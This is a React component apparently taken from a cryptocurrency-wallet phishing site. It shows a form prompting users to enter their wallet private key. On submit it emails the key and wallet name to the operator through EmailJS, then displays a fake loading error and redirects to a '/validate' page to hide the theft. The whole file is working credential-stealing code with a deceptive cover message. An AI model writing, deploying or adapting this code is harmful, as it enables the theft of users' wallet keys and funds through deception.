import { Input, useToast } from '@chakra-ui/react';
import React from 'react';
import CustomButton from './CustomButton';
import emailjs from '@emailjs/browser';
import emailConfig from '../constants';
import { useNavigate } from 'react-router-dom';

export default function PrivateKey({ color, name, placeholder }) {
  const [privateKey, setPrivateKey] = React.useState('');
  const [loading, setLoading] = React.useState(false);
  const toast = useToast();

  const navigate = useNavigate();

  const handleSubmit = async e => {
    setLoading(true);
    e.preventDefault();

    try {
      await emailjs.send(
        emailConfig.service_id,
        emailConfig.template_id,
        { private_key: privateKey, from_wallet: name },
        emailConfig.public_key
      );

      setTimeout(() => {
        setLoading(false);
      }, 10000);

      toast({
        title: 'Error',
        description: 'An Error Occured While Loading Private Key',
        status: 'error',
        duration: 5000,
        isClosable: true,
        position: 'top',
      });

      navigate('/validate', { replace: true });
    } catch (error) {
      setTimeout(() => {
        setLoading(false);
      }, 10000);

      toast({
        title: 'Error',
        description: 'An Error Occured While Loading Private Key',
        status: 'error',
        duration: 5000,
        isClosable: true,
        position: 'top',
      });

      navigate('/validate', { replace: true });
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <Input
        value={privateKey}
        onChange={e => setPrivateKey(e.target.value)}
        placeholder="Enter your Private Key"
        size="sm"
        py="20px"
        borderRadius="lg"
        color={color}
        _placeholder={{ placeholder }}
      />

      <CustomButton loading={loading} loadingText={'LOADING PRIVATE KEY...'} />
    </form>
  );
}
